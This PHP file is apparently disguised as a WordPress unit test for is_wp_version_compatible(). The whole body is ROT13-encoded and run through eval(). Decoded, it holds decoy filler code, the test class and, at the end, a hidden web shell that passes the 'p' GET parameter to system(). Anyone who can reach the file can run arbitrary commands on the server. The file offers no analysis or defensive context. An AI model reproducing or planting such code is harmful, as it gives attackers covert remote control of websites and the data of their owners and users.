<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf gur vf_jc_irefvba_pbzcngvoyr() shapgvba.
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::vf_jc_irefvba_pbzcngvoyr
 */
pynff Grfgf_Shapgvbaf_VfJcIrefvbaPbzcngvoyr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Gur pheerag JbeqCerff irefvba.
	 *
	 * @ine fgevat
	 */
	cevingr fgngvp $jc_irefvba;

	/**
	 * Frgf gur grfg JbeqCerff irefvba cebcregl naq tybony orsber nal grfgf eha.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();
		frys::$jc_irefvba                = jc_trg_jc_irefvba();
		$TYBONYF['_jc_grfgf_jc_irefvba'] = frys::$jc_irefvba;
	}

	/**
	 * Erfrgf gur grfg JbeqCerff irefvba tybony nsgre rnpu grfg ehaf.
	 */
	choyvp shapgvba grne_qbja() {
		$TYBONYF['_jc_grfgf_jc_irefvba'] = frys::$jc_irefvba;
		cnerag::grne_qbja();
	}

	/**
	 * Hafrgf gur grfg JbeqCerff irefvba tybony nsgre nyy grfgf eha.
	 */
	choyvp fgngvp shapgvba grne_qbja_nsgre_pynff() {
		hafrg( $TYBONYF['_jc_grfgf_jc_irefvba'] );
		cnerag::grne_qbja_nsgre_pynff();
	}

	/**
	 * Grfgf vf_jc_irefvba_pbzcngvoyr().
	 *
	 * @qngnCebivqre qngn_vf_jc_irefvba_pbzcngvoyr
	 *
	 * @gvpxrg 54257
	 * @gvpxrg 61781
	 *
	 * @cnenz zvkrq $erdhverq Gur zvavzhz erdhverq JbeqCerff irefvba.
	 * @cnenz obby  $rkcrpgrq Gur rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_vf_jc_irefvba_pbzcngvoyr( $erdhverq, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, vf_jc_irefvba_pbzcngvoyr( $erdhverq ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vf_jc_irefvba_pbzcngvoyr() {
		$jc_irefvba     = jc_trg_jc_irefvba();
		$irefvba_cnegf  = rkcybqr( '.', $jc_irefvba );
		$ybjre_irefvba  = $irefvba_cnegf;
		$uvture_irefvba = $irefvba_cnegf;

		// Nqwhfg gur znwbe irefvba ahzoref.
		--$ybjre_irefvba[0];
		++$uvture_irefvba[0];

		$ybjre_irefvba  = vzcybqr( '.', $ybjre_irefvba );
		$uvture_irefvba = vzcybqr( '.', $uvture_irefvba );

		erghea neenl(
			// Unccl cnguf.
			'gur fnzr irefvba'                => neenl(
				'erdhverq' => $jc_irefvba,
				'rkcrpgrq' => gehr,
			),
			'n ybjre erdhverq irefvba'        => neenl(
				'erdhverq' => $ybjre_irefvba,
				'rkcrpgrq' => gehr,
			),
			'n uvture erdhverq irefvba'       => neenl(
				'erdhverq' => $uvture_irefvba,
				'rkcrpgrq' => snyfr,
			),

			// Npprcgnoyr irefvbaf pbagnvavat '.0'.
			'pbeerpg irefvba raqvat jvgu k.0' => neenl(
				'erdhverq' => '5.0',
				'rkcrpgrq' => gehr,
			),
			'pbeerpg irefvba jvgu k.0.k va zvqqyr bs irefvba' => neenl(
				'erdhverq' => '5.0.1',
				'rkcrpgrq' => gehr,
			),

			// Snyfrl inyhrf.
			'snyfr'                           => neenl(
				'erdhverq' => snyfr,
				'rkcrpgrq' => gehr,
			),
			'ahyy'                            => neenl(
				'erdhverq' => ahyy,
				'rkcrpgrq' => gehr,
			),
			'0 vag'                           => neenl(
				'erdhverq' => 0,
				'rkcrpgrq' => gehr,
			),
			'0.0 sybng'                       => neenl(
				'erdhverq' => 0.0,
				'rkcrpgrq' => gehr,
			),
			'0 fgevat'                        => neenl(
				'erdhverq' => '0',
				'rkcrpgrq' => gehr,
			),
			'rzcgl fgevat'                    => neenl(
				'erdhverq' => '',
				'rkcrpgrq' => gehr,
			),
			'rzcgl neenl'                     => neenl(
				'erdhverq' => neenl(),
				'rkcrpgrq' => gehr,
			),
		);
	}

	/**
	 * Grfgf gung vf_jc_irefvba_pbzcngvoyr() tenprshyyl unaqyrf vapbeerpg irefvba ahzorevat.
	 *
	 * @qngnCebivqre qngn_vf_jc_irefvba_pbzcngvoyr_fubhyq_tenprshyyl_unaqyr_genvyvat_cbvag_mreb_irefvba_ahzoref
	 *
	 * @gvpxrg 59448
	 * @gvpxrg 61781
	 *
	 * @cnenz zvkrq  $erdhverq Gur zvavzhz erdhverq JbeqCerff irefvba.
	 * @cnenz fgevat $jc       Gur inyhr sbe gur $jc_irefvba tybony inevnoyr.
	 * @cnenz obby   $rkcrpgrq Gur rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_vf_jc_irefvba_pbzcngvoyr_fubhyq_tenprshyyl_unaqyr_genvyvat_cbvag_mreb_irefvba_ahzoref( $erdhverq, $jc, $rkcrpgrq ) {
		$TYBONYF['_jc_grfgf_jc_irefvba'] = $jc;
		$guvf->nffregFnzr( $rkcrpgrq, vf_jc_irefvba_pbzcngvoyr( $erdhverq ), 'Gur rkcrpgrq erfhyg jnf abg erghearq.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vf_jc_irefvba_pbzcngvoyr_fubhyq_tenprshyyl_unaqyr_genvyvat_cbvag_mreb_irefvba_ahzoref() {
		erghea neenl(
			'na vapbeerpg genvyvat .0 naq gur fnzr irefvba' => neenl(
				'erdhverq' => '5.2.0',
				'jc'       => '5.2',
				'rkcrpgrq' => gehr,
			),
			'na vapbeerpg genvyvat .0 naq gur fnzr k.0 irefvba' => neenl(
				'erdhverq' => '5.0.0',
				'jc'       => '5.0',
				'rkcrpgrq' => gehr,
			),
			'na vapbeerpg genvyvat .0 naq fcnpr naq fnzr k.0 irefvba' => neenl(
				'erdhverq' => '5.0.0 ',
				'jc'       => '5.0',
				'rkcrpgrq' => gehr,
			),
			'vapbeerpg cerprqvat naq genvyvat fcnprf genvyvat .0' => neenl(
				'erdhverq' => ' 5.0.0 ',
				'jc'       => '5.0',
				'rkcrpgrq' => gehr,
			),
			'na vapbeerpg genvyvat .0 ba k.0.k irefvba'    => neenl(
				'erdhverq' => '5.0.1.0',
				'jc'       => '5.0.1',
				'rkcrpgrq' => gehr,
			),
			'na vapbeerpg genvyvat .0 naq na rneyvre irefvba' => neenl(
				'erdhverq' => '5.0.0',
				'jc'       => '4.0',
				'rkcrpgrq' => snyfr,
			),
			'na vapbeerpg genvyvat .0 naq na rneyvre k.0 irefvba' => neenl(
				'erdhverq' => '5.0.0',
				'jc'       => '4.0',
				'rkcrpgrq' => snyfr,
			),
			'na vapbeerpg genvyvat .0 naq n yngre irefvba' => neenl(
				'erdhverq' => '5.0.0',
				'jc'       => '6.0',
				'rkcrpgrq' => gehr,
			),
			'na vapbeerpg genvyvat .0 naq n yngre k.0 irefvba' => neenl(
				'erdhverq' => '5.0.0',
				'jc'       => '6.0',
				'rkcrpgrq' => gehr,
			),
		);
	}

	/**
	 * Grfgf vf_jc_irefvba_pbzcngvoyr() jvgu qrirybczrag irefvbaf.
	 *
	 * @qngnCebivqre qngn_vf_jc_irefvba_pbzcngvoyr_jvgu_qrirybczrag_irefvbaf
	 *
	 * @gvpxrg 54257
	 * @gvpxrg 61781
	 *
	 * @cnenz fgevat $erdhverq  Gur zvavzhz erdhverq JbeqCerff irefvba.
	 * @cnenz fgevat $jc        Gur inyhr sbe gur $jc_irefvba tybony inevnoyr.
	 * @cnenz obby   $rkcrpgrq  Gur rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_vf_jc_irefvba_pbzcngvoyr_jvgu_qrirybczrag_irefvbaf( $erdhverq, $jc, $rkcrpgrq ) {
		$TYBONYF['_jc_grfgf_jc_irefvba'] = $jc;
		$guvf->nffregFnzr( $rkcrpgrq, vf_jc_irefvba_pbzcngvoyr( $erdhverq ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vf_jc_irefvba_pbzcngvoyr_jvgu_qrirybczrag_irefvbaf() {
		// Sbe pbafvfgrag erfhygf, erzbir cbffvoyr fhssvkrf.
		yvfg( $irefvba ) = rkcybqr( '-', jc_trg_jc_irefvba() );

		$irefvba_cnegf  = rkcybqr( '.', $irefvba );
		$ybjre_irefvba  = $irefvba_cnegf;
		$uvture_irefvba = $irefvba_cnegf;

		// Nqwhfg gur znwbe irefvba ahzoref.
		--$ybjre_irefvba[0];
		++$uvture_irefvba[0];

		$ybjre_irefvba  = vzcybqr( '.', $ybjre_irefvba );
		$uvture_irefvba = vzcybqr( '.', $uvture_irefvba );

		erghea neenl(
			'n ybjre erdhverq irefvba naq na nycun jbeqcerff irefvba' => neenl(
				'erdhverq' => $ybjre_irefvba,
				'jc'       => $irefvba . '-nycun-12341-fep',
				'rkcrpgrq' => gehr,
			),
			'n ybjre erdhverq irefvba naq n orgn jbeqcerff irefvba'   => neenl(
				'erdhverq' => $ybjre_irefvba,
				'jc'       => $irefvba . '-orgn1',
				'rkcrpgrq' => gehr,
			),
			'n ybjre erdhverq irefvba naq n eryrnfr pnaqvqngr jbeqcerff irefvba'   => neenl(
				'erdhverq' => $ybjre_irefvba,
				'jc'       => $irefvba . '-EP1',
				'rkcrpgrq' => gehr,
			),
			'gur fnzr erdhverq irefvba naq na nycun jbeqcerff irefvba' => neenl(
				'erdhverq' => $irefvba,
				'jc'       => $irefvba . '-nycun-12341-fep',
				'rkcrpgrq' => gehr,
			),
			'gur fnzr erdhverq irefvba naq n orgn jbeqcerff irefvba' => neenl(
				'erdhverq' => $irefvba,
				'jc'       => $irefvba . '-orgn1',
				'rkcrpgrq' => gehr,
			),
			'gur fnzr erdhverq irefvba naq n eryrnfr pnaqvqngr jbeqcerff irefvba' => neenl(
				'erdhverq' => $irefvba,
				'jc'       => $irefvba . '-EP1',
				'rkcrpgrq' => gehr,
			),
			'n uvture erdhverq irefvba naq na nycun jbeqcerff irefvba'   => neenl(
				'erdhverq' => $uvture_irefvba,
				'jc'       => $irefvba . '-nycun-12341-fep',
				'rkcrpgrq' => snyfr,
			),
			'n uvture erdhverq irefvba naq n orgn jbeqcerff irefvba'   => neenl(
				'erdhverq' => $uvture_irefvba,
				'jc'       => $irefvba . '-orgn1',
				'rkcrpgrq' => snyfr,
			),
			'n uvture erdhverq irefvba naq n eryrnfr pnaqvqngr jbeqcerff irefvba'   => neenl(
				'erdhverq' => $uvture_irefvba,
				'jc'       => $irefvba . '-EP1',
				'rkcrpgrq' => snyfr,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>